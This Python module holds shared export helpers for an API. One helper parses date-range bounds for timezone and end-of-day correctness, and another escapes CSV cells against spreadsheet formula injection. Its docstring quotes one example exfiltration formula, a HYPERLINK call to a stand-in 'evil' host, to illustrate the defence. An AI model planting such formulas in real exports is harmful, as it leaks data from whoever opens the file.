"""Shared helpers for the streaming CSV/JSONL exports under api/v1 (audit,
usage, ...). Kept in one place so a fix to either lands in every export
rather than needing to be repeated per endpoint.
"""

from __future__ import annotations

import datetime as dt
import re

from fastapi import HTTPException, status

_DATE_ONLY = re.compile(r"^\d{4}-\d{2}-\d{2}$")


def parse_date_bound(raw: str | None, *, field: str, end_of_day: bool) -> dt.datetime | None:
    """Parse a `from`/`to` range bound.

    Two things this fixes over letting FastAPI coerce straight to datetime:

    1. A date-only `to`. The operator screen sends an <input type="date"> value,
       so "2026-07-21" parsed to 2026-07-21T00:00:00 and the `ts <= to` bound
       silently dropped everything that happened on the selected day --
       invisibly, and identically in the export, so exported evidence came up
       short by up to a day. A date-only `to` now covers through end-of-day; a
       `to` that carries an explicit time still means exactly what it says.
    2. Naive values. A stored `ts` is timestamptz, and a naive bound was
       resolved against the *server process's* local timezone, so the same
       query returned different rows depending on where the API happened to
       run. Naive input is anchored to UTC, which is what the log is stored and
       rendered in. An explicit offset is honoured as given.

    Every export that takes a `from`/`to` range parses through this one
    function; they must never disagree about what a range covers.
    """
    if raw is None:
        return None
    s = raw.strip()
    if not s:
        return None
    try:
        if _DATE_ONLY.match(s):
            day = dt.date.fromisoformat(s)
            parsed = dt.datetime.combine(day, dt.time.max if end_of_day else dt.time.min)
        else:
            parsed = dt.datetime.fromisoformat(s)
    except ValueError as exc:
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
            detail=f"invalid '{field}' timestamp",
        ) from exc
    return parsed if parsed.tzinfo is not None else parsed.replace(tzinfo=dt.UTC)


_CSV_FORMULA_LEADS = ("=", "+", "-", "@")


def csv_safe(value: str) -> str:
    """Neutralise spreadsheet formula injection in a CSV cell.

    User-supplied free text (an audit `reason`, an agent or department name,
    ...) is written straight into an export, so a value starting with
    = + - @ is evaluated when it's opened in Excel or Sheets -- the standard
    exfiltration vector, e.g. =HYPERLINK("http://evil/"&A1,"ok").

    Escape chosen: a single-quote PREFIX. Excel and Sheets both treat a leading
    apostrophe as "the rest is literal text", and it survives a round-trip
    through a CSV parser as a visible, obviously-added character rather than
    silently altering the value. CSV only -- JSONL is not spreadsheet-
    interpreted and must stay a byte-faithful copy of the source record.
    """
    return "'" + value if value.startswith(_CSV_FORMULA_LEADS) else value
